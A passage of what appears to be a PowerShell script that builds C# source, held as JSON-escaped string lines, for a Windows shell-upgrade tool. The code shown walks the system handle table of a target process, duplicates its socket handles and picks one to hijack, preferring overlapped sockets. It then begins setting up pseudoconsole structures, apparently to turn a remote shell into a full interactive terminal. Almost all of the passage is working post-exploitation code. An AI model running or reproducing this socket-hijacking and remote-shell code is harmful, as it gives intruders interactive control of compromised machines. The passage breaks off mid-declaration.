	"$source += \"        List<SOCKET_BYTESIN> socketsBytesIn = new List<SOCKET_BYTESIN>();`n\"\n",
	"$source += \"        List<IntPtr> socketsOut = new List<IntPtr>();`n\"\n",
	"$source += \"        foreach (IntPtr sock in sockets)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            TCP_INFO_v0 sockInfo = new TCP_INFO_v0();`n\"\n",
	"$source += \"            if (!GetSocketTcpInfo(sock, out sockInfo))`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                closesocket(sock);`n\"\n",
	"$source += \"                continue;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"            // Console.WriteLine(`\"debug: Socket handle 0x`\" + sock.ToString(`\"X4`\") + `\" is in tcpstate `\" + sockInfo.State.ToString());`n\"\n",
	"$source += \"            // we need only active sockets, the remaing sockets are filtered out`n\"\n",
	"$source += \"            if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();`n\"\n",
	"$source += \"                sockBytesIn.handle = sock;`n\"\n",
	"$source += \"                sockBytesIn.BytesIn = sockInfo.BytesIn;`n\"\n",
	"$source += \"                socketsBytesIn.Add(sockBytesIn);`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"            else`n\"\n",
	"$source += \"                closesocket(sock);`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        if (socketsBytesIn.Count < 1) return socketsOut;`n\"\n",
	"$source += \"        if (socketsBytesIn.Count >= 2)`n\"\n",
	"$source += \"            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket`n\"\n",
	"$source += \"            socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });`n\"\n",
	"$source += \"        foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            socketsOut.Add(sockBytesIn.handle);`n\"\n",
	"$source += \"            // Console.WriteLine(`\"debug: Socket handle 0x`\" + sockBytesIn.handle.ToString(`\"X4`\") + `\" total bytes received: `\" + sockBytesIn.BytesIn.ToString());`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        return socketsOut;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    private static bool GetSocketTcpInfo(IntPtr socket, out TCP_INFO_v0 tcpInfoOut)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        int result = -1;`n\"\n",
	"$source += \"        UInt32 tcpInfoVersion = 0;`n\"\n",
	"$source += \"        int bytesReturned = 0;`n\"\n",
	"$source += \"        int tcpInfoSize = Marshal.SizeOf(typeof(TCP_INFO_v0));`n\"\n",
	"$source += \"        IntPtr tcpInfoPtr = Marshal.AllocHGlobal(tcpInfoSize);`n\"\n",
	"$source += \"        result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);`n\"\n",
	"$source += \"        if (result != 0)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            // Console.WriteLine(`\"debug: WSAIoctl1 failed with return code `\" + result.ToString() + `\" and wsalasterror: `\" + WSAGetLastError().ToString());`n\"\n",
	"$source += \"            tcpInfoOut = new TCP_INFO_v0();`n\"\n",
	"$source += \"            return false;`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));`n\"\n",
	"$source += \"        tcpInfoOut = tcpInfoV0;`n\"\n",
	"$source += \"        Marshal.FreeHGlobal(tcpInfoPtr);`n\"\n",
	"$source += \"        return true;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    // this function take a raw handle to a \\Device\\Afd object as a parameter and returns a handle to a duplicated socket`n\"\n",
	"$source += \"    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        IntPtr retSocket = IntPtr.Zero;`n\"\n",
	"$source += \"        IntPtr duplicatedSocket = IntPtr.Zero;`n\"\n",
	"$source += \"        WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();`n\"\n",
	"$source += \"        int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);`n\"\n",
	"$source += \"        if (status == 0)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            // we need an overlapped socket for the conpty process but we don`'t need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.`n\"\n",
	"$source += \"            duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);`n\"\n",
	"$source += \"            if (duplicatedSocket.ToInt64() > 0)`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                retSocket = duplicatedSocket;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        return retSocket;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    //helper method with `\"dynamic`\" buffer allocation`n\"\n",
	"$source += \"    public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        if (infoLength == 0)`n\"\n",
	"$source += \"            infoLength = Marshal.SizeOf(typeof(int));`n\"\n",
	"$source += \"        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);`n\"\n",
	"$source += \"        uint result;`n\"\n",
	"$source += \"        while (true)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            result = (uint)NtQueryObject(handle, infoClass, infoPtr, (uint)infoLength, ref infoLength);`n\"\n",
	"$source += \"            if (result == NTSTATUS_INFOLENGTHMISMATCH || result == NTSTATUS_BUFFEROVERFLOW || result == NTSTATUS_BUFFERTOOSMALL)`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                Marshal.FreeHGlobal(infoPtr);`n\"\n",
	"$source += \"                infoPtr = Marshal.AllocHGlobal((int)infoLength);`n\"\n",
	"$source += \"                continue;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"            else if (result == NTSTATUS_SUCCESS)`n\"\n",
	"$source += \"                break;`n\"\n",
	"$source += \"            else`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                //throw new Exception(`\"Unhandled NtStatus `\" + result);`n\"\n",
	"$source += \"                break;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        if (result == NTSTATUS_SUCCESS)`n\"\n",
	"$source += \"            return infoPtr;//don`'t forget to free the pointer with Marshal.FreeHGlobal after you`'re done with it`n\"\n",
	"$source += \"        else`n\"\n",
	"$source += \"            Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful`n\"\n",
	"$source += \"        return IntPtr.Zero;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        OBJECT_NAME_INFORMATION objNameInfo;`n\"\n",
	"$source += \"        long HandlesCount = 0;`n\"\n",
	"$source += \"        IntPtr dupHandle;`n\"\n",
	"$source += \"        IntPtr ptrObjectName;`n\"\n",
	"$source += \"        IntPtr ptrHandlesInfo;`n\"\n",
	"$source += \"        IntPtr hTargetProcess;`n\"\n",
	"$source += \"        string strObjectName;`n\"\n",
	"$source += \"        List<IntPtr> socketsHandles = new List<IntPtr>();`n\"\n",
	"$source += \"        DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();`n\"\n",
	"$source += \"        hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, targetProcess.Id);`n\"\n",
	"$source += \"        if (hTargetProcess == IntPtr.Zero)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            Console.WriteLine(`\"Cannot open target process with pid `\" + targetProcess.Id.ToString() + `\" for DuplicateHandle access`\");`n\"\n",
	"$source += \"            return socketsHandles;`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);`n\"\n",
	"$source += \"        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();`n\"\n",
	"$source += \"        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]`n\"\n",
	"$source += \"        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64() + IntPtr.Size);`n\"\n",
	"$source += \"        // get TypeIndex for `\"File`\" objects, needed to filter only sockets objects`n\"\n",
	"$source += \"        byte TypeIndexFileObject = GetTypeIndexByName(`\"File`\");`n\"\n",
	"$source += \"        for (int i = 0; i < HandlesCount; i++)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;`n\"\n",
	"$source += \"            try`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"            catch`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                break;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO`n\"\n",
	"$source += \"            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));`n\"\n",
	"$source += \"            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)`n\"\n",
	"$source += \"                continue;`n\"\n",
	"$source += \"            if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))`n\"\n",
	"$source += \"                { // this will avoids deadlocks on special named pipe handles`n\"\n",
	"$source += \"                    // Console.WriteLine(`\"debug: Deadlock detected`\");`n\"\n",
	"$source += \"                    CloseHandle(dupHandle);`n\"\n",
	"$source += \"                    continue;`n\"\n",
	"$source += \"                }`n\"\n",
	"$source += \"                ptrObjectName = NtQueryObjectDynamic(dupHandle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);`n\"\n",
	"$source += \"                if (ptrObjectName == IntPtr.Zero)`n\"\n",
	"$source += \"                {`n\"\n",
	"$source += \"                    CloseHandle(dupHandle);`n\"\n",
	"$source += \"                    continue;`n\"\n",
	"$source += \"                }`n\"\n",
	"$source += \"                try`n\"\n",
	"$source += \"                {`n\"\n",
	"$source += \"                    objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));`n\"\n",
	"$source += \"                }`n\"\n",
	"$source += \"                catch`n\"\n",
	"$source += \"                {`n\"\n",
	"$source += \"                    CloseHandle(dupHandle);`n\"\n",
	"$source += \"                    continue;`n\"\n",
	"$source += \"                }`n\"\n",
	"$source += \"                if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)`n\"\n",
	"$source += \"                {`n\"\n",
	"$source += \"                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);`n\"\n",
	"$source += \"                    // Console.WriteLine(`\"debug: file handle 0x`\" + dupHandle.ToString(`\"X4`\") + `\" strObjectName = `\" + strObjectName);`n\"\n",
	"$source += \"                    if (strObjectName == `\"\\Device\\Afd`\")`n\"\n",
	"$source += \"                        socketsHandles.Add(dupHandle);`n\"\n",
	"$source += \"                    else`n\"\n",
	"$source += \"                        CloseHandle(dupHandle);`n\"\n",
	"$source += \"                }`n\"\n",
	"$source += \"                else`n\"\n",
	"$source += \"                    CloseHandle(dupHandle);`n\"\n",
	"$source += \"                Marshal.FreeHGlobal(ptrObjectName);`n\"\n",
	"$source += \"                ptrObjectName = IntPtr.Zero;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        Marshal.FreeHGlobal(ptrHandlesInfo);`n\"\n",
	"$source += \"        List<IntPtr> dupedSocketsHandles = DuplicateSocketsFromHandles(socketsHandles);`n\"\n",
	"$source += \"        if (dupedSocketsHandles.Count >= 1)`n\"\n",
	"$source += \"            dupedSocketsHandles = FilterAndOrderSocketsByBytesIn(dupedSocketsHandles);`n\"\n",
	"$source += \"        socketsHandles = dupedSocketsHandles;`n\"\n",
	"$source += \"        return socketsHandles;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        bool inherited = false;`n\"\n",
	"$source += \"        List<IntPtr> parentSocketsHandles = GetSocketsTargetProcess(parentProcess);`n\"\n",
	"$source += \"        if (parentSocketsHandles.Count < 1)`n\"\n",
	"$source += \"            return inherited;`n\"\n",
	"$source += \"        foreach (IntPtr parentSocketHandle in parentSocketsHandles)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            SOCKADDR_IN sockaddrTargetProcess = new SOCKADDR_IN();`n\"\n",
	"$source += \"            SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();`n\"\n",
	"$source += \"            int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);`n\"\n",
	"$source += \"            int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);`n\"\n",
	"$source += \"            if (`n\"\n",
	"$source += \"                (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) == 0) &&`n\"\n",
	"$source += \"                (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) == 0) &&`n\"\n",
	"$source += \"                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)`n\"\n",
	"$source += \"               )`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                // Console.WriteLine(`\"debug: found inherited socket! handle --> 0x`\" + parentSocketHandle.ToString(`\"X4`\"));`n\"\n",
	"$source += \"                inherited = true;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"            closesocket(parentSocketHandle);`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        return inherited;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public static bool IsSocketOverlapped(IntPtr socket)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        bool ret = false;`n\"\n",
	"$source += \"        IntPtr sockEvent = IntPtr.Zero;`n\"\n",
	"$source += \"        int ntStatus = -1;`n\"\n",
	"$source += \"        SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();`n\"\n",
	"$source += \"        ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);`n\"\n",
	"$source += \"        if (ntStatus != NTSTATUS_SUCCESS)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            // Console.WriteLine(`\"debug: NtCreateEvent failed with error code 0x`\" + ntStatus.ToString(`\"X8`\")); ;`n\"\n",
	"$source += \"            return ret;`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();`n\"\n",
	"$source += \"        ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));`n\"\n",
	"$source += \"        // Wait for Completion `n\"\n",
	"$source += \"        if (ntStatus == NTSTATUS_PENDING)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            WaitForSingleObject(sockEvent, INFINITE);`n\"\n",
	"$source += \"            ntStatus = IOSB.status;`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        CloseHandle(sockEvent);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"        if (ntStatus != NTSTATUS_SUCCESS)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            // Console.WriteLine(`\"debug: NtDeviceIoControlFile failed with error code 0x`\" + ntStatus.ToString(`\"X8`\")); ;`n\"\n",
	"$source += \"            return ret;`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) ret = true;`n\"\n",
	"$source += \"        return ret;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        IntPtr targetSocketHandle = IntPtr.Zero;`n\"\n",
	"$source += \"        List<IntPtr> targetProcessSockets = GetSocketsTargetProcess(targetProcess);`n\"\n",
	"$source += \"        if (targetProcessSockets.Count < 1) return targetSocketHandle;`n\"\n",
	"$source += \"        else`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            foreach (IntPtr socketHandle in targetProcessSockets)`n\"\n",
	"$source += \"            {`n\"\n",
	"$source += \"                // we prioritize the hijacking of Overlapped sockets`n\"\n",
	"$source += \"                if (!IsSocketOverlapped(socketHandle))`n\"\n",
	"$source += \"                {`n\"\n",
	"$source += \"                    // Console.WriteLine(`\"debug: Found a usable socket, but it has not been created with the flag WSA_FLAG_OVERLAPPED, skipping...`\");`n\"\n",
	"$source += \"                    continue;`n\"\n",
	"$source += \"                }`n\"\n",
	"$source += \"                targetSocketHandle = socketHandle;`n\"\n",
	"$source += \"                overlappedSocket = true;`n\"\n",
	"$source += \"                break;`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"            // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets`n\"\n",
	"$source += \"            if (targetSocketHandle == IntPtr.Zero) {`n\"\n",
	"$source += \"                // Console.WriteLine(`\"debug: No overlapped sockets found. Trying to return also non-overlapped sockets...`\");`n\"\n",
	"$source += \"                foreach (IntPtr socketHandle in targetProcessSockets)`n\"\n",
	"$source += \"                {`n\"\n",
	"$source += \"                    targetSocketHandle = socketHandle;`n\"\n",
	"$source += \"                    if (!IsSocketOverlapped(targetSocketHandle)) overlappedSocket = false;`n\"\n",
	"$source += \"                    break;`n\"\n",
	"$source += \"                }`n\"\n",
	"$source += \"            }`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        if (targetSocketHandle == IntPtr.Zero)`n\"\n",
	"$source += \"            throw new UpgradeShellException(`\"No sockets found, so no hijackable sockets :( Exiting...`\");`n\"\n",
	"$source += \"        return targetSocketHandle;`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"    public static void SetSocketBlockingMode(IntPtr socket, int mode)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        int FIONBIO = -2147195266;`n\"\n",
	"$source += \"        int NonBlockingMode = 1;`n\"\n",
	"$source += \"        int BlockingMode = 0;`n\"\n",
	"$source += \"        int result;`n\"\n",
	"$source += \"        if (mode == 1)`n\"\n",
	"$source += \"            result = ioctlsocket(socket, FIONBIO, ref NonBlockingMode);`n\"\n",
	"$source += \"        else`n\"\n",
	"$source += \"            result = ioctlsocket(socket, FIONBIO, ref BlockingMode);`n\"\n",
	"$source += \"        if (result == -1)`n\"\n",
	"$source += \"            throw new UpgradeShellException(`\"ioctlsocket failed with return code `\" + result.ToString() + `\" and wsalasterror: `\" + WSAGetLastError().ToString());`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"}`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"// source from --> https://stackoverflow.com/a/3346055`n\"\n",
	"$source += \"[StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source += \"public struct ParentProcessUtilities`n\"\n",
	"$source += \"{`n\"\n",
	"$source += \"    // These members must match PROCESS_BASIC_INFORMATION`n\"\n",
	"$source += \"    internal IntPtr Reserved1;`n\"\n",
	"$source += \"    internal IntPtr PebBaseAddress;`n\"\n",
	"$source += \"    internal IntPtr Reserved2_0;`n\"\n",
	"$source += \"    internal IntPtr Reserved2_1;`n\"\n",
	"$source += \"    internal IntPtr UniqueProcessId;`n\"\n",
	"$source += \"    internal IntPtr InheritedFromUniqueProcessId;`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    [DllImport(`\"ntdll.dll`\")]`n\"\n",
	"$source += \"    private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ParentProcessUtilities processInformation, int processInformationLength, out int returnLength);`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public static Process GetParentProcess()`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        return GetParentProcess(Process.GetCurrentProcess().Handle);`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public static Process GetParentProcess(int id)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        Process process = Process.GetProcessById(id);`n\"\n",
	"$source += \"        return GetParentProcess(process.Handle);`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"`n\"\n",
	"$source += \"    public static Process GetParentProcess(IntPtr handle)`n\"\n",
	"$source += \"    {`n\"\n",
	"$source += \"        ParentProcessUtilities pbi = new ParentProcessUtilities();`n\"\n",
	"$source += \"        int returnLength;`n\"\n",
	"$source += \"        int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);`n\"\n",
	"$source += \"        if (status != 0)`n\"\n",
	"$source += \"            throw new UpgradeShellException(status.ToString());`n\"\n",
	"$source += \"        try`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"        catch (ArgumentException)`n\"\n",
	"$source += \"        {`n\"\n",
	"$source += \"            // not found`n\"\n",
	"$source += \"            return null;`n\"\n",
	"$source += \"        }`n\"\n",
	"$source += \"    }`n\"\n",
	"$source += \"}`n\"\n",
	"$source += \"`n\"\n",
	"$source2 += \"public static class UpgradeShell`n\"\n",
	"$source2 += \"{`n\"\n",
	"$source2 += \"    private const string errorString = `\"{{{UpgradeShellException}}}\r\n`\";`n\"\n",
	"$source2 += \"    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;`n\"\n",
	"$source2 += \"    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;`n\"\n",
	"$source2 += \"    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;`n\"\n",
	"$source2 += \"    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;`n\"\n",
	"$source2 += \"    private const int STARTF_USESTDHANDLES = 0x00000100;`n\"\n",
	"$source2 += \"    private const int BUFFER_SIZE_PIPE = 1048576;`n\"\n",
	"$source2 += \"    private const int WSA_FLAG_OVERLAPPED = 0x1;`n\"\n",
	"$source2 += \"    private const UInt32 INFINITE = 0xFFFFFFFF;`n\"\n",
	"$source2 += \"    private const int SW_HIDE = 0;`n\"\n",
	"$source2 += \"    private const uint GENERIC_READ = 0x80000000;`n\"\n",
	"$source2 += \"    private const uint GENERIC_WRITE = 0x40000000;`n\"\n",
	"$source2 += \"    private const uint FILE_SHARE_READ = 0x00000001;`n\"\n",
	"$source2 += \"    private const uint FILE_SHARE_WRITE = 0x00000002;`n\"\n",
	"$source2 += \"    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;`n\"\n",
	"$source2 += \"    private const uint OPEN_EXISTING = 3;`n\"\n",
	"$source2 += \"    private const int STD_INPUT_HANDLE = -10;`n\"\n",
	"$source2 += \"    private const int STD_OUTPUT_HANDLE = -11;`n\"\n",
	"$source2 += \"    private const int STD_ERROR_HANDLE = -12;`n\"\n",
	"$source2 += \"    private const int WSAEWOULDBLOCK = 10035;`n\"\n",
	"$source2 += \"    private const int FD_READ = (1 << 0);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]`n\"\n",
	"$source2 += \"    private struct STARTUPINFOEX`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        public STARTUPINFO StartupInfo;`n\"\n",
	"$source2 += \"        public IntPtr lpAttributeList;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]`n\"\n",
	"$source2 += \"    private struct STARTUPINFO`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        public Int32 cb;`n\"\n",
	"$source2 += \"        public string lpReserved;`n\"\n",
	"$source2 += \"        public string lpDesktop;`n\"\n",
	"$source2 += \"        public string lpTitle;`n\"\n",
	"$source2 += \"        public Int32 dwX;`n\"\n",
	"$source2 += \"        public Int32 dwY;`n\"\n",
	"$source2 += \"        public Int32 dwXSize;`n\"\n",
	"$source2 += \"        public Int32 dwYSize;`n\"\n",
	"$source2 += \"        public Int32 dwXCountChars;`n\"\n",
	"$source2 += \"        public Int32 dwYCountChars;`n\"\n",
	"$source2 += \"        public Int32 dwFillAttribute;`n\"\n",
	"$source2 += \"        public Int32 dwFlags;`n\"\n",
	"$source2 += \"        public Int16 wShowWindow;`n\"\n",
	"$source2 += \"        public Int16 cbReserved2;`n\"\n",
	"$source2 += \"        public IntPtr lpReserved2;`n\"\n",
	"$source2 += \"        public IntPtr hStdInput;`n\"\n",
	"$source2 += \"        public IntPtr hStdOutput;`n\"\n",
	"$source2 += \"        public IntPtr hStdError;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source2 += \"    private struct PROCESS_INFORMATION`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        public IntPtr hProcess;`n\"\n",
	"$source2 += \"        public IntPtr hThread;`n\"\n",
	"$source2 += \"        public int dwProcessId;`n\"\n",
	"$source2 += \"        public int dwThreadId;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source2 += \"    private struct SECURITY_ATTRIBUTES`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        public int nLength;`n\"\n",
	"$source2 += \"        public IntPtr lpSecurityDescriptor;`n\"\n",
	"$source2 += \"        public int bInheritHandle;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source2 += \"    private struct COORD`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        public short X;`n\"\n",
	"$source2 += \"        public short Y;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source2 += \"    private struct WSAData`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        public short wVersion;`n\"\n",
	"$source2 += \"        public short wHighVersion;`n\"\n",
	"$source2 += \"        public short iMaxSockets;`n\"\n",
	"$source2 += \"        public short iMaxUdpDg;`n\"\n",
	"$source2 += \"        public IntPtr lpVendorInfo;`n\"\n",
	"$source2 += \"        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]`n\"\n",
	"$source2 += \"        public string szDescription;`n\"\n",
	"$source2 += \"        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]`n\"\n",
	"$source2 += \"        public string szSystemStatus;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [StructLayout(LayoutKind.Sequential)]`n\"\n",
	"$source2 += \"    private struct SOCKADDR_IN`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        public short sin_family;`n\"\n",
	"$source2 += \"        public short sin_port;`n\"\n",
	"$source2 += \"        public uint sin_addr;`n\"\n",
	"$source2 += \"        public long sin_zero;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    [return: MarshalAs(UnmanagedType.Bool)]`n\"\n",
	"$source2 += \"    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    [DllImport(`\"kernel32.dll`\", SetLastError = true)]`n\"\n",
	"$source2 += \"    [return: MarshalAs(UnmanagedType.Bool)]`n\"\n",
